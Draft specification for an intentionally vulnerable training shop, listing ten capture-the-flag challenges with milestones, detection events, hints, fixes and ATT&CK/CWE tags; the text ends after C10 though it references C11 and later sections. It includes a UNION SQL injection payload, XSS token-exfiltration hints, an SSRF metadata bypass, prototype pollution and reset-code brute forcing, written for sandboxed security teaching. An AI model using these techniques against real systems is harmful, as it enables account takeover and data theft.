# VulnMart challenge specifications (C01 to C11)

Status: DRAFT for the user's review. Not locked. Date: 2026-10-08.
Audience: the shop developer (builds and tests the 11 challenges), the platform developers (detection, scoring), the interface-contract author.
Inputs: `CLAUDE.md`, `docs/prd/PRD.md`, `initial.md` (D-01 to D-27 are LOCKED and are not changed here), research notes RS-B, RS-C, RS-E, RS-F, RS-G.

## 0. How to read this file

- **PROPOSED** = a choice no locked decision fixes. I wrote my recommended option into the spec. The options are in Section 12 as decision candidates (DC-n). Nothing marked PROPOSED is final.
- **Placeholder** = a number to be tuned by a spike or the pilot.
- **VERIFIED / UNVERIFIED / CONFLICTING** = status of an outside fact, with a URL. VERIFIED means I read the page in this session (2026-10-08).
- No real flag value is written anywhere. A flag is written `<FLAG_Cnn>`. A proof marker (a non-flag string used for milestone M2) is written `<MARKER_Cnn>`.
- "Any valid path counts" (OI-17, FR-DET-05): every milestone below is defined by an **outcome**, not by a technique.

### 0.1 Rules that apply to every challenge

1. **Flags.** Derived by HMAC per instance (D-02, D-23). The orchestrator injects them at instance start into the shop database seed, or into a read-only root-owned file that only the one container needing it can read. Images contain no flag. Environment variables are not used for flags (RS-B section 7).
2. **Sentinel rule (D-26).** A flag is shown only if the intended vulnerable path was really used.
3. **Detection (D-01).** Each capture is credited by two signals where possible: the flag text in a response (the sidecar sends only a hash of the candidate string, the platform recomputes the HMAC) and an app event. The pasted flag is the backup.
4. **Milestones.** M1 = "found the weakness" (20 percent), M2 = "working exploit evidence" (40 percent), M3 = "flag captured" (100 percent). The platform computes them from signed events (FR-SCR-09). Milestones survive a reset (D-22). Events from the support bot are never counted as player activity (FR-DET-09).
5. **Proof markers.** Where M2 needs "the exploit worked but the flag is not yet read", a non-secret, non-flag marker sits next to the flag (for example another row of the same table). A marker is public inside the write-up, so it is not a secret and gives no points by itself. It only counts when it appears in a response to the exploit. PROPOSED (DC-15).
6. **Start state.** The brief names the starting account and never contains a flag (FR-CHL-15). All accounts exist in every instance (Section 8).
7. **Independence.** No challenge needs another. No challenge may give code execution or file read in the shop container (FR-CHL-13).
8. **Fixed build.** For tests, the shop starts with `VM_BUILD=fixed` (PROPOSED name). It contains the fix described in each write-up.
9. **Events carry ids and metadata only** (D-22, D-25). The one exception is the capture event (Section 10).

## 1. ID re-verification (OI-35)

All checked on 2026-10-08 on the official sites. I changed no ID, because none was wrong. Notes below say what I looked at.

### 1.1 CWE (cwe.mitre.org/data/definitions/N.html)

| CWE | Exact name as printed | Status |
|---|---|---|
| 79 | Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') | VERIFIED https://cwe.mitre.org/data/definitions/79.html |
| 89 | Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') | VERIFIED https://cwe.mitre.org/data/definitions/89.html |
| 209 | Generation of Error Message Containing Sensitive Information | VERIFIED https://cwe.mitre.org/data/definitions/209.html |
| 223 | Omission of Security-relevant Information | VERIFIED https://cwe.mitre.org/data/definitions/223.html |
| 307 | Improper Restriction of Excessive Authentication Attempts | VERIFIED https://cwe.mitre.org/data/definitions/307.html |
| 328 | Use of Weak Hash | VERIFIED https://cwe.mitre.org/data/definitions/328.html |
| 345 | Insufficient Verification of Data Authenticity | VERIFIED https://cwe.mitre.org/data/definitions/345.html |
| 489 | Active Debug Code (not deprecated, mappable) | VERIFIED https://cwe.mitre.org/data/definitions/489.html |
| 636 | Not Failing Securely ('Failing Open') | VERIFIED https://cwe.mitre.org/data/definitions/636.html |
| 639 | Authorization Bypass Through User-Controlled Key | VERIFIED https://cwe.mitre.org/data/definitions/639.html |
| 640 | Weak Password Recovery Mechanism for Forgotten Password | VERIFIED https://cwe.mitre.org/data/definitions/640.html |
| 755 | Improper Handling of Exceptional Conditions | VERIFIED https://cwe.mitre.org/data/definitions/755.html |
| 778 | Insufficient Logging | VERIFIED https://cwe.mitre.org/data/definitions/778.html |
| 799 | Improper Control of Interaction Frequency | VERIFIED https://cwe.mitre.org/data/definitions/799.html |
| 840 | Business Logic Errors | VERIFIED https://cwe.mitre.org/data/definitions/840.html |
| 841 | Improper Enforcement of Behavioral Workflow | VERIFIED https://cwe.mitre.org/data/definitions/841.html |
| 862 | Missing Authorization | VERIFIED https://cwe.mitre.org/data/definitions/862.html |
| 863 | Incorrect Authorization | VERIFIED https://cwe.mitre.org/data/definitions/863.html |
| 918 | Server-Side Request Forgery (SSRF) | VERIFIED https://cwe.mitre.org/data/definitions/918.html |
| 1004 | Sensitive Cookie Without 'HttpOnly' Flag (used only in the C03 fix text) | VERIFIED https://cwe.mitre.org/data/definitions/1004.html |
| 1321 | Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') | VERIFIED https://cwe.mitre.org/data/definitions/1321.html |
| 1395 | Dependency on Vulnerable Third-Party Component | VERIFIED https://cwe.mitre.org/data/definitions/1395.html |
| 330, 338, 347, 353, 396, 234, 497, 1188, 1104 | Names taken from RS-E and RS-F | VERIFIED by those notes only, not re-read by me. I do not use them as primary tags below. |

CWE-79 is on the official OWASP 2025 A05 Injection list: VERIFIED https://top10.owasp.org/2025/A05_2025-Injection (the page title is "A05:2025 Injection"; CWE-79 appears in "List of Mapped CWEs"). This confirms the 2025 tag for the XSS part.

### 1.2 ATT&CK (attack.mitre.org)

| ID | Exact name | Status |
|---|---|---|
| T1190 | Exploit Public-Facing Application | VERIFIED https://attack.mitre.org/techniques/T1190/ |
| T1078 | Valid Accounts | VERIFIED https://attack.mitre.org/techniques/T1078/ |
| T1110.001 | Password Guessing | VERIFIED https://attack.mitre.org/techniques/T1110/001/ |
| T1552.005 | Cloud Instance Metadata API | VERIFIED https://attack.mitre.org/techniques/T1552/005/ |
| T1565.001 | Stored Data Manipulation | VERIFIED https://attack.mitre.org/techniques/T1565/001/ |
| T1657 | Financial Theft | VERIFIED https://attack.mitre.org/techniques/T1657/ (the fit for C02 and C04 is approximate: ATT&CK has no "guess a voucher" or "repeat a refund" technique. State this in the report.) |
| T1059.007 | JavaScript | VERIFIED https://attack.mitre.org/techniques/T1059/007/ (new, used for C03 part B) |
| T1539 | Steal Web Session Cookie | VERIFIED https://attack.mitre.org/techniques/T1539/ (considered, NOT used: our bot cookie is HttpOnly and the payload steals an API value, not the cookie) |

C11: ATT&CK has no clean "fail open" technique. Keep T1190 and say so (as the PRD already does).
WSTG IDs (for example WSTG-INPV-05): UNVERIFIED. The WSTG pages print section numbers, not the `WSTG-XXXX-NN` codes (RS-E, RS-F). I do not add WSTG tags in this file. Re-check against the exact WSTG edition before the report.

### 1.3 OWASP edition tags

2025 A05 Injection page VERIFIED (above). The other 2025 titles and the 2021 mapping are taken from PRD 5.6.1 and D-06; not re-fetched by me, UNVERIFIED in this session. The A03 CWE-477 versus CWE-447 typo on OWASP's A03 page (OI-35) was not re-checked by me; leave it as RS-E found it (CONFLICTING inside the OWASP page).

---

## 2. The 11 challenge specifications

Format per challenge: start state, M1 / M2 / M3 with detection signal, flag, hints, write-up outline, tags, automated test, unintended-exploit risks. Event names are defined in Section 10.

### C01 Broken Access Control (2021 A01 / 2025 A01) - difficulty 2

**Host feature.** Seller order detail `GET /api/seller/orders/{orderNo}` and the HTML page behind it. Order numbers are sequential (`VM-100245`). The handler checks "caller is seller owner or staff" but not "order contains an item of the caller's store".

**Start state.** Seeded seller **staff** login `staff.harbor` of store Harbor Crafts (approved). No onboarding needed.

| Milestone | Outcome | Detection signal |
|---|---|---|
| M1 | The server returned another store's order to the player. | App event `shop.cross_store_order_read` (caller store differs from order store), first one. |
| M2 | The player enumerated several foreign orders (placeholder N = 3 distinct orders) or read an order of the target store Northwind Tea Co. | Platform counts distinct `order_id` in `shop.cross_store_order_read`, or `order_store` = target. |
| M3 | Flag read. | `proxy.flag_seen` on route `/api/seller/orders/{orderNo}` or the HTML order page, from a session whose store is not Northwind; plus event. Paste is the backup. |

M1 and M2 are weak signals by design (reading any foreign order is already the exploit). PROPOSED (DC-14).

**Flag.** `orders.buyer_note` of one seeded Northwind order, written by the injector. Other seeded orders hold fake buyers and no secrets.
**Why no other challenge reads it.** The field is not in the support-console order view, the finance view, or the catalog database (PROPOSED, DC-9). Support agents can read any order by the permission matrix (RS-G), so the buyer note must be hidden from that view or a C09 solve would read it.

**Hints.**
1. Your order list shows only your own store. Look at how one order is identified when you open it.
2. Order numbers run in sequence. Does the server check which store an order belongs to?
3. Ask for an order number that is not in your list. Read the buyer note of a competitor store's order.

**Write-up outline.** Vulnerable idea: lookup by `order_no` only. Fix: `WHERE order_no = ? AND store_id = :callerStore` or a deny-by-default policy layer; unguessable IDs only as defence in depth; per-endpoint test that a second tenant gets 403 or 404. Tags below.

**Tags.** CWE-639 (primary), CWE-862, CWE-863. ATT&CK T1190, T1078. OWASP 2025 A01, 2021 A01.

**Automated test.** Input: log in as `staff.harbor`, request the seeded Northwind order number. Vulnerable build: 200 and the body holds the flag hash match, event `shop.cross_store_order_read` seen, M1 to M3 credited. Fixed build: 403 or 404, no event, no milestone. Also assert the support-console order view contains no `buyer_note` field.

**Unintended-exploit risks.** (a) Enumeration leaks other secrets: seeded orders hold fake buyers only. (b) Scan load: platform rate limit (placeholder 30 requests per second per instance). (c) The same endpoint must not expose the C04 order of the player in a way that changes C04 state (read-only). (d) Order endpoint must not return the `payment_ref` of a C08 order (field omitted in the seller view).

---

### C02 Cryptographic Failures (2021 A02 / 2025 A04) - difficulty 3

**Host feature.** Gift cards. Code = `VM-` + first 12 hex characters of an unsalted MD5 of the card serial written as a decimal string. The receipt shows "Card no. 1043". Redeem: `POST /api/wallet/redeem`.

**Start state.** Seeded customer login `cust.player` (or any self-registered customer). Buying a card uses the simulated payment.

Seeded cards (PROPOSED): serial 1 (holds the flag in its message), serials 2 and 3 ("staff test cards": a proof marker in the message, a small amount). Sold cards start at serial 1001.

| Milestone | Outcome | Detection signal |
|---|---|---|
| M1 | The player tried a well-formed code that is not one of their own cards (testing a derivation). | `shop.giftcard_attempt` with `result = unknown_wellformed` (code matches `VM-` + 12 hex, not issued to the player). Weak signal (DC-14). |
| M2 | The player redeemed a card they did not buy and that is not the flag card (serial 2 or 3). | `shop.giftcard_attempt` with `result = redeemed`, `card_class = unsold_test`; response contains `<MARKER_C02>`. |
| M3 | Flag card redeemed. | `shop.giftcard_attempt` `card_class = flag_card`, plus `proxy.flag_seen` on `/api/wallet/redeem`. |

**Flag.** `gift_cards.message` of serial 1, returned only in the redeem response. Injection: DB seed.
**Why no other challenge reads it.** Not in the catalog DB, not shown anywhere except the redeem response. All shop passwords use a strong adaptive hash, so no leak elsewhere can hand over a crackable MD5 (FR-SHP-09).

**Hints.**
1. Look at your two gift card codes. Do they look random?
2. The code is a fingerprint of something printed on the receipt. Which common hash gives 32 hex characters?
3. Hash the serial of the oldest card the same way. Use the first 12 characters with the same prefix as your cards.

**Write-up outline.** Vulnerable idea: a bare unkeyed hash of a counter used as a secret. Fix: 128-bit random codes from a CSPRNG, store only a keyed hash, single-use, rate limit and lock redemption, log failures; HMAC if a hash is needed. Tags below.

**Tags.** CWE-328 (primary), CWE-799 (no limit on guessing). RS-E also lists CWE-330 and CWE-338 (names VERIFIED by RS-E only). ATT&CK T1657 (approximate fit). OWASP 2025 A04, 2021 A02.

**Automated test.** Buy two cards, derive the pattern, compute the code for serial 1, redeem. Vulnerable: redeem returns the flag; M2 test redeems serial 2 first. Fixed: the derived code is rejected (4xx), no event with `redeemed`.

**Unintended-exploit risks.** (a) Credit must not buy anything: it goes to a separate non-spendable `promo_credit` ledger (never the C04 refund ledger and never a wallet usable at checkout). (b) Enumerating serials: platform throttle 60 redeem calls per minute (FR-CHL-03). (c) The weak hash is the only weak crypto in the shop.

---

### C03 Injection (2021 A03 / 2025 A05) - two parts - difficulty: part A 2, part B 3, challenge 3 (PROPOSED, DC-2)

C03 has two parts (D-18). The full design of part B is in Section 3. Scoring of the two parts is PROPOSED (DC-1): both parts are needed for M3.

**Start state.** Part A needs no account (anonymous search). Part B needs the seeded customer `cust.player` (a ticket author).

**Combined milestone rule (PROPOSED, DC-1).**

| Milestone | Outcome | Detection signal |
|---|---|---|
| M1 | The player found a weakness in either part. | Part A: `shop.catalog_query_error` (a SQL error from search) or a CRS `attack-sqli` match on `/api/products/search` (`proxy.crs_match`). Part B: `shop.ticket_markup_stored` (a ticket message was stored that contains an HTML tag). |
| M2 | One part was fully exploited. | Part A: the search response holds `<MARKER_C03A>` (a row of `ops_notes` that is not a product), or the flag. Part B: `collector.hit` with `bot_tagged = true` (the payload ran in the bot browser) or a valid token. |
| M3 | Both flags captured. | Part A: `proxy.flag_seen` challenge `C03A` on the search route. Part B: `collector.hit` with a valid token hash for `C03B`. Paste of either flag is the backup. |

#### C03 part A: UNION SQL injection in product search

**Host feature.** `GET /api/products/search?q=...`. The server builds `SELECT id,name,price,store FROM catalog_products WHERE status='published' AND name LIKE '%<q>%'` by string concatenation. The query runs against the **separate read-only catalog data store** (FR-INS-02): its own container, no users, tokens, orders or other flags. One statement per call, timeout about 2 seconds.
**Flag.** Table `ops_notes`, row 2 (`body`), in the catalog store. Row 1 holds `<MARKER_C03A>`. Injection: the injector writes both rows before the store is switched to read-only.
**Why no other challenge reads it.** The catalog store holds only products, reviews and `ops_notes`. The shop database file is in a different container and cannot be attached.
**Hints (part A).** 1. What happens when your search text contains a single quote? 2. Your text ends up inside a database query; UNION can add rows from another table if the column count matches. 3. The query has four columns; read the tables of the catalog database, one holds merchandising notes.
**Write-up outline.** Vulnerable: string concatenation. Fix: parameterised query, allow-list for sort fields, least-privilege account, generic errors.
**Tags.** CWE-89, ATT&CK T1190.
**Test.** Vulnerable: `' UNION SELECT 1,body,3,4 FROM ops_notes--` (column count adapted) returns the marker and the flag. Fixed: zero rows, no error text, no event. Also assert: a stacked statement (`;`) does nothing, a sleep-style query is cut at about 2 seconds, and the catalog store holds no table with users or orders.
**Risks.** Cross-solve through a dump (prevented by the separate store). Freeze by heavy query (read-only, timeout). SQLite `ATTACH` or `load_extension` (spike: confirm both unavailable, UNVERIFIED).

#### C03 part B: stored XSS seen by the support-agent bot

Full design in Section 3. One-line summary: a customer writes a support ticket message; the support console shows it unescaped; the support bot opens it; the payload reads a per-instance token that only the bot's session can read and sends it to the in-instance collector.
**Flag.** The bot account's `console_key` value, returned only by `/support/api/agent-profile` to the bot's session (Section 3.5).
**Tags.** CWE-79 (VERIFIED name above), ATT&CK T1190 plus T1059.007. OWASP 2025 A05, 2021 A03.

**Hints (part B).** 1. A support agent reads what customers write to support. How does the agent's screen show it? 2. Text you send may be shown as page code, not as plain text. What can code on the agent's screen reach that you cannot? 3. Put a small script in a ticket message that reads the agent's profile page data and sends it to your listener address from the brief.

**Combined hint display.** Three levels per challenge: each level shows the part A line and the part B line together, and costs once (FR-SCR-03). PROPOSED.

---

### C04 Insecure Design (2021 A04 / 2025 A06) - difficulty 3

Resolution of OI-19 is in Section 4 (summary: a "Quick refund" path added next to a correct refund model, with its own limit check and no cumulative check).

**Start state.** Seeded customer `cust.player` with one seeded delivered order, total paid 2,500 (placeholder).

| Milestone | Outcome | Detection signal |
|---|---|---|
| M1 | The player used the instant refund rule on the seeded order (accepted, or refused for being above the limit). | `shop.refund_decision` with `path = quick`, any `decision`. Weak signal (DC-14). |
| M2 | Two or more quick refunds were auto-approved on one order (the repeat pattern works). | Platform counts `shop.refund_decision` with `path = quick` and `decision = auto_approved` for one `order_id`, count >= 2. |
| M3 | The refunded total passed the amount paid and the goodwill line appeared. | `shop.refund_invariant_broken` plus `proxy.flag_seen` on the refund statement route. |

**Flag.** `reference` of a `goodwill_adjustment` ledger row, created only when the sum of refunds on an order is greater than the amount paid (sentinel). The value is read from the sentinel table at that moment. Injection: DB seed (sentinel table, read only by the ledger reconcile job).
**Why no other challenge reads it.** The row does not exist until the invariant is broken. The sentinel table is in the shop DB, which no other challenge can read (C03 uses the catalog store). Forged-paid orders (C08) are not refundable (Section 4.5).

**Hints.**
1. Refund your delivered order. Then look at what the shop says is still refundable.
2. The instant-refund rule looks at each request alone. Does anything add the requests up?
3. Ask for a refund below the instant limit twice, so the sum is more than you paid.

**Write-up outline.** Vulnerable: a second feature (quick refund) written without the shared invariant. Fix: one `assertRefundable` used by every path, a refundable balance per order enforced in a transaction with a row lock, the threshold applied to the cumulative total, a count cap, idempotency keys; an abuse-case review at design time. Tags below.

**Tags.** CWE-840 (primary), CWE-841, CWE-799. ATT&CK T1657 (approximate). OWASP 2025 A06, 2021 A04.

**Automated test.** Input: two `POST /api/orders/{id}/refunds {amount:1500, idempotency_key}` calls with different keys. Vulnerable: both 2xx, statement has the goodwill line, events as above. Fixed: the second call is 4xx and no goodwill row. Also assert: an item-level refund after the quick refunds is refused when it would pass the amount paid (shows the rest of the model is correct); a negative or non-integer amount is refused.

**Unintended-exploit risks.** (a) Money goes to a non-spendable `refund_ledger`. (b) No race: the intended path is sequential; the idempotency key stops a double-click from counting twice. (c) The seller payout debit stays inside the instance and feeds no other challenge. (d) Only seeded delivered orders can be quick-refunded (customers cannot mark an order delivered).

---

### C05 Security Misconfiguration (2021 A05 / 2025 A02) - difficulty 2

**Host feature.** An operations console left on: `/_ops/` (index) and `/_ops/diagnostics`, no login. `POST /api/cart` with broken JSON returns a stack trace that names the route file under `_ops`.

**Start state.** None (anonymous visitor).

| Milestone | Outcome | Detection signal |
|---|---|---|
| M1 | A verbose error was served to the player. | `shop.verbose_error` with `handler = c05_api`. |
| M2 | An `/_ops/` page was served to a non-internal client. | `ops.page_served` (path `/_ops/` or any child), client class not internal. |
| M3 | Flag read from diagnostics. | `proxy.flag_seen` on `/_ops/diagnostics`; plus `ops.page_served` with `path = /_ops/diagnostics`. |

**Flag.** One value in a hand-built synthetic diagnostics object (a "support bridge token" entry), built at start-up from the injected seed. Injection: DB seed read by the object builder.
**Why no other challenge reads it.** The object holds only synthetic values. It contains no environment variables, database URL, session secret, dependency versions, or internal service names (FR-CHL-06, C10, C06 conflicts).

**Hints.**
1. Break something on purpose and read the error closely.
2. The error shows a file path. An internal tools area is mounted near it.
3. Request the diagnostics page of the operations area with no login and read the config values.

**Write-up outline.** Vulnerable: debug route shipped, verbose handler. Fix: do not ship debug routes; management endpoints on a separate port or localhost; generic errors with a correlation ID; no secrets in dumps; a release hardening checklist.

**Tags.** CWE-489 (primary), CWE-209. ATT&CK T1190 (T1595.003 Wordlist Scanning, VERIFIED by RS-E, if the path is found by scanning). OWASP 2025 A02, 2021 A05.

**Automated test.** Vulnerable: send broken JSON, assert the trace mentions `_ops`; request `/_ops/diagnostics`, assert flag. Fixed: 404 and a generic error with an id.

**Unintended-exploit risks.** The main host-safety rule: the object is hand-built. Never `process.env`, never a database URL, session secret or the instance key. C05's error handler shares no code with C10 or C11.

---

### C06 Vulnerable and Outdated Components (2021 A06) / Software Supply Chain Failures (2025 A03) - difficulty 4

**Host feature.** Seller bulk catalog import preview, run by the isolated import service (lodash 4.17.11, `_.defaultsDeep`). The notices page `/legal/open-source` and a CycloneDX SBOM list the versions.

**Start state.** Seeded seller **owner** login `owner.harbor` (approved store).

| Milestone | Outcome | Detection signal |
|---|---|---|
| M1 | The player sent import options that contain a prototype-style key. | `import.job` with `flagged_keys = true`. The parent process (which never merges user data) checks the raw options text for the keys `__proto__`, `constructor`, `prototype` before the job starts. |
| M2 | Prototype pollution really happened in the job. | `import.job` with `polluted = true` (the child reports that a key it did not set exists on a fresh plain object after the merge). |
| M3 | The audit token was returned. | `proxy.flag_seen` on the import preview route (response field `auditToken`); `import.job` with `audit_token_issued = true`. |

M1 deliberately does not count a page view of the notices page or SBOM: a click must not earn 20 percent of a Hard challenge.

**Flag.** The `auditToken` value. It sits in a read-only root-owned file mounted **only** in the import service container. The parent passes it to the child process; the child puts it in the response only when `ctx.flags.internalAudit` is true. The user cannot set that flag directly, only through the pollution.
**Why no other challenge reads it.** The import service has no network, no database, and holds no other flag. The shop container has no copy.

**Hints.**
1. The shop lists the open-source software it uses. Which parts of the import service look old?
2. One library has a public advisory about merging objects when a JSON key is named in a special way.
3. Put a `constructor` key holding a `prototype` object in your import options, set the property that the preview response calls audit-only, and run the preview again.

**Write-up outline.** Vulnerable: untrusted JSON into `defaultsDeep`, key check after the merge. Fix: upgrade lodash (4.17.12 or later; use the current release), lockfile plus SBOM plus scanning on every build, validate keys before merging, safe merge, `Object.create(null)`; for the 2025 scope add pinned lockfiles, provenance, delayed adoption of new versions, least-privilege CI.

**Tags.** CWE-1395 (primary), CWE-1321. ATT&CK T1190 (T1592.002 and T1195.001 are VERIFIED by RS-E and used in the write-up only). OWASP 2025 A03, 2021 A06. CVE-2019-10744 VERIFIED by RS-E at https://github.com/advisories/GHSA-jf85-cpcp-j695 (not re-read by me).

**Automated test.** Vulnerable: preview with the pollution options, assert `auditToken` equals the flag and both import events. Fixed: same request returns `auditToken: null`. Plus a build test that the SBOM shows exactly one known high finding (lodash). The exact input must be confirmed on Node 24 (spike S-9, not run).

**Unintended-exploit risks.** Fresh child process per job so pollution dies with the job; no `child_process`, template engine or dynamic `require` in the child; read-only filesystem; about 5 s timeout; no network; lodash 4.17.11 only in this service; a vendored tarball built offline; CI must not "fix" the intended finding (Dependabot alerts documented as intentional). Jobs are scoped per store (C01 conflict).

---

### C07 Authentication Failures (2021 A07 / 2025 A07) - difficulty 2

**Host feature.** Password reset (`/auth/forgot`, `/auth/reset/confirm`). The code has 4 digits, lives 15 minutes, has no attempt limit, and the form answers differently for "no such account" and "code sent". Target: the finance account.

**Start state.** Seeded customer `cust.player` (or none). The finance mailbox address is on the public Contact page (PROPOSED, DC-10), because a customer cannot see seller payout statements.

| Milestone | Outcome | Detection signal |
|---|---|---|
| M1 | The player requested a reset for the finance account (target found). | `auth.reset_requested` with `account_role = finance` from a non-finance session. |
| M2 | The finance password was changed through the reset flow (account takeover). | `auth.password_reset_completed` with `account_role = finance`. Backup: more than 500 failed confirms (`auth.reset_confirm_batch`) then a success. |
| M3 | Flag read on the finance settlement settings page. | `proxy.flag_seen` on `/finance/settings/settlement` for a finance session. |

**Flag.** "Settlement reference" on the finance settings page, shown only to a finance session. Injection: DB seed. There is no finance bot, so any response holding it is a player.
**Why no other challenge reads it.** Only a finance session shows the page. The finance account holds no other flag. The sandbox mailbox is on the internal network only and the player cannot read it.

**Hints.**
1. Finance staff forget passwords too. How does the shop prove who you are when you do?
2. Look at how long the reset code is and what happens after many wrong tries.
3. Request a reset for the finance mailbox, then send every possible code to the confirm step with a tool.

**Write-up outline.** Vulnerable: 4-digit code, no attempt limit, enumeration. Fix: 128-bit single-use token hashed at rest, attempt limit per token and per account, generic responses, notify the owner, end sessions after reset.

**Tags.** CWE-307 (primary), CWE-640. ATT&CK T1110.001, T1078. OWASP 2025 A07, 2021 A07.

**Automated test.** Vulnerable: request reset; read the code from the test-only mailbox API (`VM_TEST=1`, not exposed to players); loop 10,000 codes (the test may start near the code to save time); set a password; log in; assert flag only for the new session. Fixed: the loop is stopped by the attempt limit and the token dies.

**Unintended-exploit risks.** (a) Mailbox internal only. (b) Reset-confirm failures are logged normally (so C07 never looks like the silent C09 signal); batched in the platform event. (c) Platform safety throttle at the proxy (placeholder 50 requests per second) so 10,000 calls take a few minutes and cannot hurt the instance; spike S2 measures this. (d) The finance password after takeover is player-chosen and affects only this instance.

---

### C08 Software or Data Integrity Failures (2021 A08 / 2025 A08) - difficulty 3

**Host feature.** `POST /webhooks/payments`, documented on the public "Seller integration" help page and visible in checkout JavaScript. The mock gateway signs events with HMAC. The handler skips the signature check when header `X-Gateway-Mode: sandbox` is present. It still checks amount equals the order total and the order is `pending_payment`.

**Start state.** Seeded customer `cust.player`; the player creates an order and stops at "Pay".

| Milestone | Outcome | Detection signal |
|---|---|---|
| M1 | The player posted a payment event of their own to the webhook. | `webhook.received` with `source = non_gateway` (the call did not come from the mock gateway), any result. |
| M2 | An unsigned event was accepted and the order turned paid. | `order.paid` with `verified = false`, plus `webhook.received` `accepted = true`. Backup rule: `order.paid` for an order with no `gateway.ledger_entry`. |
| M3 | Sentinel flag read. | `proxy.flag_seen` on the webhook response or the order page. |

**Flag.** `payment_ref` of a payment accepted through the sandbox bypass. The shop writes it from the sentinel table only on that path. An honest checkout, a price-tampering route, or a signed gateway event never produces it.
**Why no other challenge reads it.** It does not exist until the path is taken. Seeded orders are `delivered` or `refunded` and the handler only touches `pending_payment` orders.

**Hints.**
1. Who tells the shop that a payment succeeded? Is it the customer's browser?
2. Find the endpoint the payment provider calls and check what it demands from the caller.
3. Replay the provider's message yourself, and look for a header that changes how strictly it is checked.

**Write-up outline.** Vulnerable: test-mode bypass left in production config. Fix: always verify the HMAC (constant-time compare, timestamp window, event-id idempotency), remove the bypass, confirm payment with the provider API.

**Tags.** CWE-345 (primary; RS-F notes CWE-347 is related only, not on the A08 list). ATT&CK T1190, T1565.001. OWASP 2025 A08, 2021 A08.

**Automated test.** Vulnerable: create order, POST unsigned event with the sandbox header, assert `paid` and the flag; same POST without the header gives 400 and no change; a legitimate gateway flow gives no flag. Fixed: the sandbox POST gives 400.

**Unintended-exploit risks.** (a) Only `pending_payment` orders change. (b) A forged-paid order is stored as `captured_unverified` and is not refundable (Section 4.5), so it never becomes money for C04. (c) The header exists on no other route. (d) Gateway signing key is not a flag and is not exposed by C05.

---

### C09 Logging and Alerting Failures (2021 A09 / 2025 A09) - difficulty 3

**Host feature.** Legacy mobile login `/m/api/v1/login` (named on the "Get the app" page and in web JavaScript): no security event, no lockout, no rate limit. Web login locks the account after 5 failures for 5 minutes and raises an alert on the admin Security Alerts page. Target: dormant support agent `s.iyer` (a different account from the XSS bot) with a weak password from common wordlists.

**Start state.** Seeded customer `cust.player`; the player brings a wordlist.

| Milestone | Outcome | Detection signal |
|---|---|---|
| M1 | The player used the legacy login route. | `auth.attempt` with `route = legacy` (platform telemetry, separate from the shop's security log). |
| M2 | "Attack happened, nothing logged, nothing alerted." | Negative-observation rule (FR-DET-06): for one account, at least 20 `auth.attempt` failures with `route = legacy`, then one success, within 10 minutes, and zero `shop.security_event_written` events for that account in the same window. |
| M3 | Flag read in the support case notes. | `proxy.flag_seen` on the case-notes route for a support session that is not the bot. |

**Flag.** A "break-glass reference" in a support case note assigned to `s.iyer`. Injection: DB seed. Readable by support sessions and admin only.
**Why no other challenge reads it.** The bot session cannot read case notes (Section 3.6). Finance, customer and seller roles cannot. The `s.iyer` support console shows no buyer notes (C01) and `s.iyer`'s `console_key` is a normal random value, not the C03 flag.

**Hints.**
1. Try the web login a few times. What does the shop do to you? Is every door guarded the same way?
2. The shop also has a phone-app API. Compare what happens when you fail there.
3. Guess the dormant support agent's password on the app route, then use the token on the web side.

**Write-up outline.** Vulnerable: one auth route missing from the security-event pipeline, no lockout. Fix: one shared auth service for all channels, log every authentication event, alert on thresholds, a test that every route emits events, retire legacy APIs. Learner screen shows "Your attack was invisible to the shop's security log" as evidence (RS-F).

**Tags.** CWE-778 (primary), CWE-223, CWE-307 (missing lockout). ATT&CK T1110.001, T1078. OWASP 2025 A09, 2021 A09.

**Automated test.** Vulnerable: 25 bad logins plus the right one on the legacy route; assert zero security events and no alert for the account, M2 credited, then use the token for the flag. Then 6 bad web logins: assert one alert and a lock. Fixed: the legacy route emits events and locks.

**Unintended-exploit risks.** (a) C07 failures are logged normally; C09 counts legacy failures only. (b) A learner who locks `s.iyer` through the web route does not block the legacy route (lock lasts 5 minutes). (c) The weak password is not accepted by finance. (d) The player cannot read or write `security_events` (no log viewer for non-admin). (e) Case notes hold no other flag. (f) The bot never logs in through any login route, so it never adds security events (Section 3.6).

---

### C10 Server-Side Request Forgery (2021 A10 / 2025 A01) - difficulty 4

Resolution of OI-20 is in Section 5: the player starts as the seeded **approved** seller owner, so C10 does not depend on C11.

**Host feature.** Product editor, "Import image from URL". The shop fetches the URL and shows a preview. A string blocklist rejects `localhost`, `127.0.0.1`, `169.254.169.254`, the exact internal name `metadata.vulnmart.internal`, and any URL not starting with `http` (PROPOSED: the list names exactly these strings, so a variant form passes; the developer picks one working variant in a spike). If the response is not an image, the error shows the first 200 characters ("Not an image: ...").

**Start state.** Seeded seller owner `owner.harbor` (approved store Harbor Crafts).

| Milestone | Outcome | Detection signal |
|---|---|---|
| M1 | The player pointed the importer at an internal-looking address. | `importer.fetch_attempt` with `url_class` in `loopback`, `private`, `link_local`, `internal_name`. |
| M2 | The importer reached an internal service. | `meta.request_served` with `ua_class = importer` (any path, for example `/healthz`). The shop's own legitimate calls use another user agent class (`rates`). |
| M3 | Sentinel flag read. | `meta.request_served` path `/latest/user-data`, `ua_class = importer`, plus `proxy.flag_seen` on the importer response. |

**Flag.** In the text of `/latest/user-data` of the fake metadata service (`vm-meta`, part of the mock-services container), within the first 200 characters. It comes from a read-only file mounted only in mock-services.
**Why no other challenge reads it.** `vm-meta` has no other flag. The fetcher supports only http and https, so `file://` cannot read the shop's files. No shop flag is in the shop environment. Mock-services holds the C08 gateway key and the C03 collector, which are not flags.

**Hints.**
1. The shop is making a web request for you. From where is that request sent?
2. The shop tries to stop you from reaching itself. Is it checking text, or where the address really goes?
3. Cloud servers often keep a private info service at a fixed address. Ask the importer to fetch its startup data.

**Write-up outline.** Vulnerable: string blocklist. Fix: allow-list of image hosts, resolve DNS then check the final IP against private ranges, re-check after redirects, deny link-local and internal ranges at the network layer, token-based metadata (IMDSv2 style), generic errors, do not return bodies.

**Tags.** CWE-918. ATT&CK T1190, T1552.005 (VERIFIED). OWASP 2025 A01, 2021 A10.

**Automated test.** Vulnerable: import the bypass URL for `/latest/user-data`, assert flag and the `meta.request_served` event. External URL: fails with a connect error within about 3 seconds (no egress). `file://` and `gopher://` rejected. Fixed: bypass URL refused.

